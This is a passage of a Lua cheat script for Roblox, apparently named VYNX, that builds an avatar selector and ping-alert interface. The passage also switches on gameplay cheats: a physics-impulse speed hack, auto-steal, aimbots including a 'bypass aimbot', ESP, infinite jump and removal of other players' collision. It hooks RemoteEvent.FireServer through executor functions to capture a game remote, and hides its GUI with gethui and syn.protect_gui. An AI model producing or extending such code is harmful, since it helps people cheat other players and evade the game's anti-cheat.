    title.TextColor3 = AVLOG_WHITE
    title.TextSize = 20
    title.Font = Enum.Font.GothamBlack
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 62
    title.Parent = win

    local sub = Instance.new("TextLabel")
    sub.Position = UDim2.new(0, 18, 0, 36)
    sub.Size = UDim2.new(1, -110, 0, 14)
    sub.BackgroundTransparency = 1
    sub.Text = "TAP AN AVATAR TO WEAR IT"
    sub.TextColor3 = AVLOG_DIM
    sub.TextSize = 10
    sub.Font = Enum.Font.GothamBold
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.ZIndex = 62
    sub.Parent = win

    local close = uiSmallBtn({ Parent = win, Pos = UDim2.new(1, -40, 0, 12), Size = UDim2.new(0, 28, 0, 28),
        Text = "X", Col = AVLOG_WHITE, Bg = AVLOG_BTN_BG, TS = 13, CR = 8, Z = 63 })
    close.MouseButton1Click:Connect(function()
        M.avLogCloseWindow()
    end)

    local bigVp, bigItem = M.avLogMakeBigPreview(win, Vector3.new(0, 0, 420))
    bigVp.Position = UDim2.new(0, 12, 0, 58)
    bigVp.Size = UDim2.new(1, -24, 0, 300)
    M._avLogWinBig = bigItem

    do
        local cap = Instance.new("TextLabel")
        cap.Position = UDim2.new(0, 8, 0, 8)
        cap.Size = UDim2.new(0, 170, 0, 16)
        cap.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        cap.BackgroundTransparency = 0.55
        cap.BorderSizePixel = 0
        cap.Text = "AVATAR PREVIEW (360)"
        cap.TextColor3 = AVLOG_WHITE
        cap.TextSize = 9
        cap.Font = Enum.Font.GothamBold
        cap.ZIndex = 2
        cap.Parent = bigVp
        Instance.new("UICorner", cap).CornerRadius = UDim.new(0, 6)
    end

    local selHead = Instance.new("TextLabel")
    selHead.Position = UDim2.new(0, 14, 0, 366)
    selHead.Size = UDim2.new(1, -28, 0, 16)
    selHead.BackgroundTransparency = 1
    selHead.Text = "COOL SELECTOR"
    selHead.TextColor3 = AVLOG_ACCENT
    selHead.TextSize = 11
    selHead.Font = Enum.Font.GothamBold
    selHead.TextXAlignment = Enum.TextXAlignment.Left
    selHead.ZIndex = 62
    selHead.Parent = win

    local row = Instance.new("ScrollingFrame")
    row.Position = UDim2.new(0, 12, 0, 386)
    row.Size = UDim2.new(1, -24, 0, 142)
    row.BackgroundTransparency = 1
    row.BorderSizePixel = 0
    row.ScrollBarThickness = 2
    row.ScrollBarImageColor3 = Color3.fromRGB(150, 150, 158)
    row.ScrollBarImageTransparency = 0.35
    row.ScrollingDirection = Enum.ScrollingDirection.X
    row.ElasticBehavior = Enum.ElasticBehavior.Always
    row.AutomaticCanvasSize = Enum.AutomaticSize.None
    row.ZIndex = 62
    row.Parent = win
    local rowLay = Instance.new("UIListLayout")
    rowLay.FillDirection = Enum.FillDirection.Horizontal
    rowLay.Padding = UDim.new(0, 8)
    rowLay.SortOrder = Enum.SortOrder.LayoutOrder
    rowLay.Parent = row

    local entries = {}
    for _, e in ipairs(M.AVLOG_RARE or {}) do table.insert(entries, e) end
    table.insert(entries, { name = "Off", value = "Remove outfit", isOff = true })

    M._avLogChipRefs = {}

    local chipIdx = 0
    for _, e in ipairs(entries) do
        chipIdx = chipIdx + 1
        local dummy
        local isRare = false
        if not e.isOff then
            isRare = true
            pcall(function() dummy = M.avLogMakeRareDummy(e, chipIdx, Vector3.new(0, 0, 420)) end)
        end
        if not dummy then
            pcall(function()
                dummy = M.avLogFigure(M.avLogOffVis(), AVLOG_BASE + Vector3.new((chipIdx or 1) * 30, 0, 0) + Vector3.new(0, 0, 420), false)
            end)
        end

        local chip = Instance.new("TextButton")
        chip.Name = "Chip_" .. tostring(e.name)
        chip.Size = UDim2.new(0, 96, 0, 134)
        chip.BackgroundColor3 = AVLOG_ROW_BG
        chip.BackgroundTransparency = 0.22
        chip.BorderSizePixel = 0
        chip.Text = ""
        chip.AutoButtonColor = false
        chip.ZIndex = 62
        chip.Parent = row
        do
            local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = chip
            local s = Instance.new("UIStroke"); s.Thickness = 1; s.Color = AVLOG_STROKE; s.Transparency = 0.35; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = chip
        end

        local vp = Instance.new("ViewportFrame")
        vp.Position = UDim2.new(0, 6, 0, 6)
        vp.Size = UDim2.new(0, 84, 0, 84)
        vp.BackgroundColor3 = AVLOG_VIEW_BG
        vp.BackgroundTransparency = 0
        vp.BorderSizePixel = 0
        vp.Ambient = Color3.fromRGB(96, 100, 110)
        vp.LightColor = Color3.fromRGB(255, 255, 255)
        vp.ZIndex = 62
        vp.Parent = chip
        Instance.new("UICorner", vp).CornerRadius = UDim.new(0, 8)
        local cam = Instance.new("Camera")
        cam.CameraType = Enum.CameraType.Scriptable
        cam.FieldOfView = 40
        cam.Parent = vp
        vp.CurrentCamera = cam
        if dummy then pcall(function() dummy.Parent = vp end) end
        local cc = { cam = cam, model = dummy, angle = chipIdx * 2, dist = 9.5, center = (dummy and dummy.PrimaryPart and dummy.PrimaryPart.Position or AVLOG_BASE) + Vector3.new(0, -0.2, 0) }
        table.insert(M._avLogSpinners, cc)
        pcall(function() M.avLogOrbit(cam, cc.center, cc.angle, cc.dist) end)

        local nm = Instance.new("TextLabel")
        nm.Position = UDim2.new(0, 4, 0, 90)
        nm.Size = UDim2.new(1, -8, 0, 16)
        nm.BackgroundTransparency = 1
        nm.Text = e.name
        nm.TextColor3 = (e.name == M.wornAvatar) and AVLOG_ACCENT or AVLOG_WHITE
        nm.TextSize = 11
        nm.Font = Enum.Font.GothamBold
        nm.ZIndex = 62
        nm.Parent = chip

        local vl = Instance.new("TextLabel")
        vl.Position = UDim2.new(0, 4, 0, 108)
        vl.Size = UDim2.new(1, -8, 0, 16)
        vl.BackgroundTransparency = 1
        vl.Text = e.isOff and "REMOVE OUTFIT" or (isRare and "RARE AVATAR" or "SKIN")
        vl.TextColor3 = e.isOff and AVLOG_DIM or AVLOG_ACCENT
        vl.TextSize = 9
        vl.Font = Enum.Font.GothamBold
        vl.ZIndex = 62
        vl.Parent = chip

        M._avLogChipRefs[e.name] = { nameLbl = nm }

        chip.MouseButton1Click:Connect(function()
            pcall(function() M.avLogWear(e.name) end)
        end)
    end

    row.CanvasSize = UDim2.new(0, math.max(0, chipIdx * 104 - 8), 0, 0)

    M.avLogEnsureSpin()
end

task.defer(function()
    local t0 = tick()
    while M._introUIReady == false and tick() - t0 < 45 do task.wait(0.1) end
    task.wait(1.0)
    if M.avLogOutfitEnabled and M.wornAvatar and M.wornAvatar ~= "" then
        pcall(function() M.avLogWear(M.wornAvatar, true) end)
    end
end)

player.CharacterAdded:Connect(function(char)
    task.wait(1.0)
    if M.avLogOutfitEnabled and M.wornAvatar and M.wornAvatar ~= "" and player.Character == char then
        pcall(function() M.avLogWear(M.wornAvatar, true) end)
    end
end)

task.spawn(function()
    while true do
        task.wait(1.5)
        if not (M.avLogOutfitEnabled and M.wornAvatar and M.wornAvatar ~= "") then continue end
        local char = player.Character
        if not char then continue end
        pcall(function() M.avLogMaintain(char) end)
    end
end)

repeat task.wait() until game:IsLoaded()
task.wait(0.05)
pcall(loadCherryConfig)
-- Re-apply saved Anti Lag / Stretch after config load
task.defer(function()
    task.wait(0.4)
    if M.antiLagEnabled then pcall(function() if M.enableAntiLag then M.enableAntiLag() end end) end
    if M.stretchEnabled then pcall(function() if M.enableStretchRez then M.enableStretchRez() end end) end
    pcall(function() if M.setAntiLagVisual then M.setAntiLagVisual(M.antiLagEnabled == true) end end)
    pcall(function() if M.setStretchVisual then M.setStretchVisual(M.stretchEnabled == true) end end)
end)
M.stealBarStyle = "New"
M.stealBarSize = math.clamp(tonumber(M.stealBarSize) or 220, 180, 480)
M.uiScale = math.clamp(tonumber(M.uiScale) or 0.6, 0.5, 1.2)
if M.uiScaleRef then M.uiScaleRef.Scale = M.uiScale end
M.antiKickEnabled = false
M.introGUIEnabled = false

pcall(function() if M.disableAntiKick then M.disableAntiKick() end end)
pcall(function()
    if M.antiSummerBaseEnabled then
        if M.enableAntiSummerBase then M.enableAntiSummerBase() end
    else
        if M.disableAntiSummerBase then M.disableAntiSummerBase() end
    end
end)
pcall(function()
    if M._savedTheme and CHERRY_THEMES[M._savedTheme] then
        CherryConfig.Theme = M._savedTheme
        M.colorScheme = M._savedTheme
    elseif M.colorScheme and CHERRY_THEMES[M.colorScheme] then
        CherryConfig.Theme = M.colorScheme
        M._savedTheme = M.colorScheme
    else
        CherryConfig.Theme = "Black White"
        M.colorScheme = "Black White"
        M._savedTheme = "Black White"
    end
end)
M.uiColorName = (M.getUiColorEntry and M.getUiColorEntry(M.uiColorName or "Ocean").name) or "Ocean"
pcall(applyAccentFromTheme)
pcall(saveCherryConfig)

-- Force main UI (intro removed; never stay blank)
M._introUIReady = true
M._buildingGui = false
M.menuOpen = true
pcall(function() VYNX_emergencyToast("VYNX booting UI...") end)
local function _forceBuild()
    M._introUIReady = true
    M._buildingGui = false
    M.menuOpen = true
    local ok, err = pcall(function()
        if M.buildGui then M.buildGui() end
    end)
    if not ok then
        warn("[VYNX] buildGui error: " .. tostring(err))
        pcall(function() VYNX_emergencyToast("VYNX UI error — check F9") end)
    end
    -- Ensure frame visible if it exists
    pcall(function()
        if M.mainFrame then M.mainFrame.Visible = true end
        if M.gui then M.gui.Enabled = true end
        M.menuOpen = true
    end)
end
_forceBuild()
if not (M.gui and M.gui.Parent) then
    task.defer(function()
        task.wait(0.35)
        _forceBuild()
    end)
end
task.delay(1.5, function()
    if not (M.gui and M.gui.Parent and M.mainFrame and M.mainFrame.Parent) then
        warn("[VYNX] UI still missing — hard rebuild")
        _forceBuild()
    end
end)
task.delay(3.0, function()
    if not (M.gui and M.gui.Parent and M.mainFrame and M.mainFrame.Parent) then
        warn("[VYNX] UI still missing — final rebuild")
        _forceBuild()
    end
end)
pcall(function() if M.applyOceanSky then M.applyOceanSky() end end)
task.defer(function()
    task.wait(1.2)
    pcall(function() if M.applyOceanSky then M.applyOceanSky() end end)
    task.wait(4.0)
    pcall(function() if M.applyOceanSky then M.applyOceanSky() end end)
end)
task.spawn(function()
    while true do
        task.wait(10)
        pcall(function() if M.applyOceanSky then M.applyOceanSky() end end)
    end
end)
pcall(function() if M.applyHeaderTitle then M.applyHeaderTitle() end end)
pcall(function() if M.retintBackgrounds then M.retintBackgrounds() end end)
pcall(function() if M.refreshStealBarAccent then M.refreshStealBarAccent() end end)
pcall(function()
    if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
    if M.updateHeadTheme then M.updateHeadTheme() end
    if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end

end)
task.defer(function()
    task.wait(0.35)
    pcall(function() if M.applyStealBarTheme then M.applyStealBarTheme(M.accentColor()) end end)
    pcall(function() if M.refreshStealBarAccent then M.refreshStealBarAccent() end end)
    pcall(function() if M.refreshESPColors then M.refreshESPColors() end end)
    pcall(function() if M.sweepAccentRecolor then M.sweepAccentRecolor() end end)
    pcall(function() if M.refreshUiColorSwatches then M.refreshUiColorSwatches() end end)
end)
if M.mobileButtonsEnabled then M.buildMobileButtons() end
if M.antiRagdollEnabled then M.startAntiRagdoll() end
    if M.hardHitEnabled then M.startHardHit() end
    if M.setHardHitVisual then M.setHardHitVisual(M.hardHitEnabled) end
if M.infJumpEnabled then
    if M.infJumpMode=="manual" then M.startManualInfJumpLoop()
    elseif M.infJumpMode=="hold" then M.startHoldInfJump() end
end
if M.medusaCounterEnabled then M.setupMedusa(player.Character) end
if M.batCounterEnabled then M.startBatCounter() end

do
    local ALLOWED = { Vampire = true, ["Amazon Unboxed"] = true, Zombie = true, Tryhard = true, ["Wicked Popular"] = true }
    if M.animPackEnabled and type(M.animPack) == "string" and ALLOWED[M.animPack] then
        M.unwalkEnabled = false
    elseif M.unwalkEnabled == true then
        M.animPackEnabled = false
        M.animPack = nil
    else
        M.animPackEnabled = false
        M.animPack = nil
        M.unwalkEnabled = false
    end
    task.defer(function()
        pcall(function() M.applyWalkState(player.Character) end)
    end)
end
if M.setUnwalkVisual then pcall(function() M.setUnwalkVisual(M.unwalkEnabled == true) end) end
if M.autoTPEnabled then M.startAutoTP() end
if M.autoBatEnabled then M.queueAutoBatStart() end
if M.autoLeftEnabled then M.startAutoLeft() end
if M.autoRightEnabled then M.startAutoRight() end
if M.Steal.AutoStealEnabled then M.startAutoSteal() end
if M.batTPEnabled and M.startBatTPAimbot then
    M._batTPRunningVersion = nil -- force apply saved Bat TP version logic on rejoin
    pcall(function() M.startBatTPAimbot() end)
end
if M.bypassAimbotEnabled then M.startBypassAimbot() end
M.mirrorTPDownEnabled = true
if M.noPlayerCollisionEnabled and M.setNoPlayerCollision then pcall(function() M.setNoPlayerCollision(true) end) end
if M.antiSummerBaseEnabled and M.enableAntiSummerBase then pcall(M.enableAntiSummerBase) end
if M.setAntiSummerBaseVisual then pcall(function() M.setAntiSummerBaseVisual(M.antiSummerBaseEnabled == true) end) end
if M.setHeadlessVisual then pcall(function() M.setHeadlessVisual(M.headlessEnabled == true) end) end
if M.setKorbloxVisual then pcall(function() M.setKorbloxVisual(M.korbloxEnabled == true) end) end

M.antiKickEnabled = false
-- Do NOT force antiLag/stretch off — respect saved config

task.defer(function()
    while M._introUIReady == false do task.wait(0.1) end
    task.wait(1.0)
    M.fpsBoostEnabled = false
    pcall(function() if M.disableFpsBoost then M.disableFpsBoost() end end)
    -- Re-apply saved Anti Lag / Stretch (survives rejoin)
    if M.antiLagEnabled then
        pcall(function() if M.enableAntiLag then M.enableAntiLag() end end)
    end
    if M.stretchEnabled then
        pcall(function() if M.enableStretchRez then M.enableStretchRez() end end)
    end
    pcall(function() if M.setAntiLagVisual then M.setAntiLagVisual(M.antiLagEnabled == true) end end)
    pcall(function() if M.setStretchVisual then M.setStretchVisual(M.stretchEnabled == true) end end)
    if M.dawgOptimizerEnabled and M.enableDawgOptimizer then
        task.wait(0.1)
        pcall(function() M.enableDawgOptimizer() end)
    end
end)

if M.removeAccEnabled then M.startRemoveAcc() end

if M.animPackEnabled and M.animPack and M.PACKS[M.animPack] then
    task.wait(0.5)
    M.applyAnimPack(M.animPack)
else
    M.animPackEnabled = false
    M.animPack = nil
end

task.wait(0.05)

M.vynxBlackSkinEnabled = false

pcall(function() M.applyWalkState(player.Character) end)
pcall(function()
    if player.Character and M.applyCharterToChar then
        M.applyCharterToChar(player.Character)
    end
end)

if M.showPlayerSpeeds then M.togglePlayerSpeeds(true) end
if M.playerESPEnabled and M.toggleESP then
    task.defer(function()
        while M._introUIReady == false do task.wait(0.1) end
        task.wait(0.35)
        pcall(function() M.toggleESP(true) end)
    end)
end

M.updateStatusRadius()
M.startHeadSpeedUpdates()

if player.Character then
    M.setupHeadIndicator(player.Character)
    M.setupRagdollTriggers()
end
player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    M.setupHeadIndicator(char)
    if M.hardHitEnabled then task.defer(function() M.hideHardHitRing(); M.showHardHitRing() end) end
    M.setupRagdollTriggers()
    if M.medusaCounterEnabled then M.setupMedusa(char) end
    if M.batCounterEnabled then M.startBatCounter() end
    task.wait(0.35)

    M.applyCharterToChar(char)
    task.delay(0.8, function()
        if player.Character == char then M.applyCharterToChar(char) end
    end)
    if M.bypassAimbotEnabled then
        task.wait(0.2)
        M.startBypassAimbot()
    end
end)

do
    local _ncAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        _ncAcc = _ncAcc + (dt or 0.016)
        if _ncAcc < 1.5 then return end
        _ncAcc = 0
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player then
                local ch = p.Character
                if ch then
                    local hrp = ch:FindFirstChild("HumanoidRootPart")
                    if hrp and hrp.CanCollide then hrp.CanCollide = false end
                    local head = ch:FindFirstChild("Head")
                    if head and head.CanCollide then head.CanCollide = false end
                end
            end
        end
    end)
end

-- =====================================================================
-- SPEED METHOD FROM K7 Duels: mass ApplyImpulse + ground-aware gain
-- + grounded horizontal brake (exact studs/sec feel)
-- =====================================================================
local _moveDt = 1/60
local _speedActive = false
local _lastHorizSpeed = 0
local _lastGroundNormalY = 1

local function sampleGround(hrp)
    local ok, res = pcall(function()
        local origin = hrp.Position + Vector3.new(0, 2, 0)
        local params = RaycastParams.new()
        params.FilterType = Enum.RaycastFilterType.Exclude
        local char = hrp.Parent
        if char then params.FilterDescendantsInstances = {char} end
        params.IgnoreWater = true
        local hit = workspace:Raycast(origin, Vector3.new(0, -8, 0), params)
        if hit and hit.Normal then
            return {ny = hit.Normal.Y, grounded = (hit.Distance < 4.2)}
        end
        return {ny = 1, grounded = false}
    end)
    if ok and type(res) == "table" and type(res.ny) == "number" then
        _lastGroundNormalY = res.ny
        return res.ny, res.grounded == true
    end
    return _lastGroundNormalY, false
end

local function setSpeedConstraint(hrp, horizVel)
    if not hrp or not hrp.Parent then return end
    local hx, hz = horizVel.X, horizVel.Z
    local mag = math.sqrt(hx * hx + hz * hz)
    _lastHorizSpeed = mag
    _speedActive = mag > 0.05
    if mag < 0.05 then return end
    pcall(function()
        local ny, grounded = sampleGround(hrp)
        local v = hrp.AssemblyLinearVelocity
        local mass = hrp.AssemblyMass
        if not mass or mass ~= mass or mass <= 0 then mass = 1 end
        local gain = 0.85
        if grounded then
            if ny < 0.55 then gain = 0.45
            elseif ny < 0.78 then gain = 0.62
            else gain = 0.9 end
        else
            gain = 0.7
        end
        local target = Vector3.new(hx, v.Y, hz)
        hrp:ApplyImpulse((target - v) * mass * gain)
    end)
end

local function brakeHorizontal(hrp)
    if not hrp or not hrp.Parent then return end
    pcall(function()
        local ny, grounded = sampleGround(hrp)
        if not grounded then return end
        local v = hrp.AssemblyLinearVelocity
        local hx, hz = v.X, v.Z
        local hMag = math.sqrt(hx * hx + hz * hz)
        if hMag < 0.8 then
            if hMag > 0.05 then
                hrp.AssemblyLinearVelocity = Vector3.new(0, v.Y, 0)
            end
            return
        end
        local mass = hrp.AssemblyMass
        if not mass or mass ~= mass or mass <= 0 then mass = 1 end
        local target = Vector3.new(0, v.Y, 0)
        hrp:ApplyImpulse((target - v) * mass * 0.92)
    end)
end

-- Compat stubs for auto-left / auto-right that still call LV helpers
local function _speedLVSet(hrp, x, z)
    if hrp then setSpeedConstraint(hrp, Vector3.new(x, 0, z)) end
end
local function _speedLVClear(hrp)
    if hrp then
        _speedActive = false
        _lastHorizSpeed = 0
        brakeHorizontal(hrp)
    end
end
M._speedLVSet = _speedLVSet
M._speedLVClear = _speedLVClear

local function destroySpeed()
    _speedActive = false
    _lastHorizSpeed = 0
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        local lv = hrp:FindFirstChild("_RHSpeedLV")
        if lv then pcall(function() lv:Destroy() end) end
    end
end

local _speedRsAcc = 0
RunService.Heartbeat:Connect(function(dt)
    _moveDt = dt or _moveDt
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end
    if M.isRagdollState and M.isRagdollState(hum) then
        M.lastMoveDir = Vector3.new(0, 0, 0)
        _speedActive = false
        _lastHorizSpeed = 0
        brakeHorizontal(hrp)
        return
    end
    local spd = M.getActiveMoveSpeed()
    local controlled = not M.autoBatEnabled and not M.batTPEnabled and not M.autoLeftEnabled and not M.autoRightEnabled and not M.bypassAimbotEnabled
    if controlled then
        local md = hum.MoveDirection
        if md.Magnitude > 0.05 then
            M.lastMoveDir = Vector3.new(md.X, 0, md.Z).Unit
            setSpeedConstraint(hrp, M.lastMoveDir * spd)
        else
            _speedActive = false
            _lastHorizSpeed = 0
            brakeHorizontal(hrp)
        end
    else
        brakeHorizontal(hrp)
    end
    _speedRsAcc = _speedRsAcc + (dt or 0.016)
    if _speedRsAcc >= 0.2 then
        _speedRsAcc = 0
        pcall(function() if M.updateAutoSwitchSpeed then M.updateAutoSwitchSpeed() end end)
    end
end)


pcall(function()
    if hookfunction and newcclosure then
        local oldFire
        oldFire=hookfunction(Instance.new("RemoteEvent").FireServer,newcclosure(function(self,...)
            if not M.cursedResetRemote and typeof(self)=="Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3)=="RE/" then M.cursedResetRemote=self end
            return oldFire(self,...)
        end))
    end
end)
task.spawn(function()
    task.wait(2); if M.cursedResetRemote then return end
    for _,desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1,3)=="RE/" then M.cursedResetRemote=desc; break end
    end
end)

M.applyFOV()

pcall(function()
    M.refreshWalkSpeedAutoSwitch()
    if M.customFontSelected and M.customFontSelected ~= "None" then
        task.spawn(function()
            task.wait(0.4)
            pcall(function() M.applyCustomFont(M.customFontSelected) end)
        end)
    end
end)

function M.playIntro()
    -- Intro fully removed — always go straight to main UI
    M.introGUIEnabled = false
    M._introUIReady = true
    M._buildingGui = false
    if M.loadMainUIAfterIntro then
        pcall(function() M.loadMainUIAfterIntro() end)
    elseif M.buildGui then
        pcall(function() M.buildGui() end)
    end
end

task.spawn(function()
    task.wait(0.2)
    M.introGUIEnabled = false
    M._introUIReady = true
    M._buildingGui = false
    pcall(function()
        if M.buildGui then M.buildGui() end
    end)
end)
-- Bypass removed
pcall(function()
    M.bypassPanelOpen = false
    M.bypassOnSteal = false
    if M.destroyBypassPanel then M.destroyBypassPanel() end
end)

-- Failsafe: force main UI quickly if still blank
task.spawn(function()
    task.wait(2)
    if not (M.gui and M.gui.Parent) then
        warn("[VYNX] UI missing — forcing main UI")
        M._introUIReady = true
        M._buildingGui = false
        pcall(function()
            if M.loadMainUIAfterIntro then M.loadMainUIAfterIntro() end
        end)
        pcall(function() if M.buildGui then M.buildGui() end end)
    end
    task.wait(3)
    if not (M.gui and M.gui.Parent) and M.buildGui then
        M._introUIReady = true
        M._buildingGui = false
        pcall(function() M.buildGui() end)
    end
end)
pcall(function()
    M.killLaggerOpen = false
    M.pingPanelOpen = false
    pcall(function() if M.setPingPanelOpen then M.setPingPanelOpen(false) end end)
    if M.autoCarryEnemyBaseEnabled then M.startAutoCarryEnemyBase() end
end)
pcall(function() if M.topBannerGui then M.topBannerGui:Destroy() end; M.topBannerGui=nil end)

pcall(function()
    if M._enemyVisConn then M._enemyVisConn:Disconnect() end
    local acc = 0
    M._enemyVisConn = RunService.Heartbeat:Connect(function(dt)
        acc = acc + (dt or 0.016)
        if acc < 3.0 then return end
        acc = 0
        if M.ensureEnemyVisibility then pcall(M.ensureEnemyVisibility) end
    end)
end)

task.spawn(function()
    task.wait(0.5)
    if M.vynxWhiteSkinEnabled == nil then M.vynxWhiteSkinEnabled = false end
    if player.Character then
        pcall(function() M.applyCharterToChar(player.Character) end)
    end
end)

task.defer(function()
    task.wait(0.6)
    if false and M.vynxHornsEnabled and M.setVynxHorns then
        pcall(function() M.setVynxHorns(true) end)
    end
    local char = player.Character
    if char then
        pcall(function() M.applyCharterToChar(char) end)
        if M.animPackEnabled and M.animPack and M.applyAnimPack then
            pcall(function() M.applyAnimPack(M.animPack) end)
        end
    end
end)

player.CharacterAdded:Connect(function(char)
    task.wait(0.25)
    pcall(function()
        if M.applyCharterToChar then M.applyCharterToChar(char) end
        -- Respect toggles only: unwalk OFF + anim OFF => original animations
        if M.applyWalkState then
            M.applyWalkState(char)
        elseif M.animPackEnabled == true and type(M.animPack) == "string" and M.PACKS and M.PACKS[M.animPack] then
            if M.applyAnimPack then M.applyAnimPack(M.animPack) end
        elseif M.unwalkEnabled == true then
            if M.startUnwalk then M.startUnwalk() end
        else
            M.unwalkEnabled = false
            if M.forceVanillaAnimate then M.forceVanillaAnimate(char) end
        end
        task.delay(0.6, function()
            if player.Character == char and M.applyWalkState then
                pcall(function() M.applyWalkState(char) end)
            end
        end)
        task.delay(1.5, function()
            if player.Character == char and M.applyWalkState then
                pcall(function() M.applyWalkState(char) end)
            end
        end)
    end)
end)

task.defer(function()
    task.wait(0.8)
    pcall(function()
        if M.nukeOptimizerEnabled and M.enableNukeOptimizer then M.enableNukeOptimizer() end
        if M.dawgOptimizerEnabled and M.enableDawgOptimizer then M.enableDawgOptimizer() end
        if M.bodyLockEnabled and M.startBodyLock then M.startBodyLock() end
        if M.antiRagdollEnabled and M.startAntiRagdoll then M.startAntiRagdoll() end
        if M.hardHitEnabled and M.startHardHit then M.startHardHit() end
        if M.autoBatEnabled and M.queueAutoBatStart then M.queueAutoBatStart() end
        if M.batCounterEnabled and M.startBatCounter then M.startBatCounter() end
        if M.autoLeftEnabled and M.startAutoLeft then M.startAutoLeft() end
        if M.autoRightEnabled and M.startAutoRight then M.startAutoRight() end
        if M.autoTPEnabled and M.startAutoTP then M.startAutoTP() end
        if M.removeAccEnabled and M.startRemoveAccessories then M.startRemoveAccessories() end
        if M.animPackEnabled and M.animPack and M.applyAnimPack then
            M.applyAnimPack(M.animPack)
        end
        if player.Character and M.applyCharterToChar then M.applyCharterToChar(player.Character) end
    end)
end)



-- Bypass panel fully removed
M.bypassPanelOpen = false
M.bypassOnSteal = false
M._bypassGui = nil
function M.destroyBypassPanel()
    pcall(function()
        local pg = player and player:FindFirstChild("PlayerGui")
        if pg then
            local o = pg:FindFirstChild("VynxBypass")
            if o then o:Destroy() end
        end
        pcall(function()
            local o2 = game:GetService("CoreGui"):FindFirstChild("VynxBypass")
            if o2 then o2:Destroy() end
        end)
        if typeof(gethui) == "function" then
            local h = gethui()
            if h then
                local o3 = h:FindFirstChild("VynxBypass")
                if o3 then o3:Destroy() end
            end
        end
    end)
    M._bypassGui = nil
end
function M.buildBypassPanel()
    return nil
end
function M.setBypassPanelOpen()
    M.bypassPanelOpen = false
    M.destroyBypassPanel()
end
function M.applyBypassBackground() end
function M._startBypassOnStealWatch()
    M.bypassOnSteal = false
    if M._bypassOnStealConn then
        pcall(function() M._bypassOnStealConn:Disconnect() end)
        M._bypassOnStealConn = nil
    end
end
M._bypassForceStart = function() end
M._bypassForceStop = function() end

function M.startPingAlert()
    if M._pingAlertTask then
        pcall(function() task.cancel(M._pingAlertTask) end)
        M._pingAlertTask = nil
    end
    M.pingAlertEnabled = true
    local plrGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
    if not plrGui then return end

    if M.pingPopupGui then pcall(function() M.pingPopupGui:Destroy() end) end

    local notifGui = Instance.new("ScreenGui")
    notifGui.Name = "VynxPingAlert"
    notifGui.ResetOnSpawn = false
    notifGui.IgnoreGuiInset = true
    notifGui.DisplayOrder = 90
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(notifGui) end
    end)
    local parented = false
    if gethui then parented = pcall(function() notifGui.Parent = gethui() end) end
    if not parented then parented = pcall(function() notifGui.Parent = game:GetService("CoreGui") end) end
    if not parented then notifGui.Parent = plrGui end
    M.pingPopupGui = notifGui

    local notifFrame = Instance.new("Frame", notifGui)
    notifFrame.Size = UDim2.new(0, 248, 0, 58)
    notifFrame.Position = UDim2.new(1, -268, 0, -80)
    notifFrame.BackgroundColor3 = Color3.fromRGB(6, 10, 16)
    notifFrame.BorderSizePixel = 0
    notifFrame.Visible = true
    Instance.new("UICorner", notifFrame).CornerRadius = UDim.new(0, 12)
    local nStroke = Instance.new("UIStroke", notifFrame)
    nStroke.Color = Color3.fromRGB(40, 130, 210)
    nStroke.Thickness = 1.6
    nStroke.Transparency = 0.15
    do
        local bgGrad = Instance.new("UIGradient", notifFrame)
        bgGrad.Rotation = 90
        bgGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 22, 36)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 8, 14)),
        })
    end

    local strip = Instance.new("Frame", notifFrame)
    strip.Size = UDim2.new(0, 4, 1, -10)
    strip.Position = UDim2.new(0, 5, 0, 5)
    strip.BackgroundColor3 = Color3.fromRGB(60, 170, 255)
    strip.BorderSizePixel = 0
    Instance.new("UICorner", strip).CornerRadius = UDim.new(1, 0)
    do
        local sg = Instance.new("UIGradient", strip)
        sg.Rotation = 90
        sg.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 230, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 90, 180)),
        })
    end

    local icon = Instance.new("TextLabel", notifFrame)
    icon.Size = UDim2.new(0, 28, 0, 28)
    icon.Position = UDim2.new(0, 16, 0.5, -14)
    icon.BackgroundTransparency = 1
    icon.Text = "⚡"
    icon.TextColor3 = Color3.fromRGB(90, 185, 255)
    icon.Font = Enum.Font.GothamBlack
    icon.TextSize = 18
    icon.ZIndex = 2

    local topLbl = Instance.new("TextLabel", notifFrame)
    topLbl.Size = UDim2.new(1, -56, 0, 22)
    topLbl.Position = UDim2.new(0, 46, 0, 8)
    topLbl.BackgroundTransparency = 1
    topLbl.Text = "HIGH PING"
    topLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    topLbl.Font = Enum.Font.GothamBlack
    topLbl.TextSize = 13
    topLbl.TextXAlignment = Enum.TextXAlignment.Left
    topLbl.ZIndex = 2
    do
        local tg = Instance.new("UIGradient", topLbl)
        tg.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 185, 255)),
        })
    end

    local pingLbl = Instance.new("TextLabel", notifFrame)
    pingLbl.Size = UDim2.new(1, -56, 0, 18)
    pingLbl.Position = UDim2.new(0, 46, 0, 30)
    pingLbl.BackgroundTransparency = 1
    pingLbl.Text = "0 ms  ·  Duel"
    pingLbl.TextColor3 = Color3.fromRGB(140, 185, 230)
    pingLbl.Font = Enum.Font.GothamBold
    pingLbl.TextSize = 12
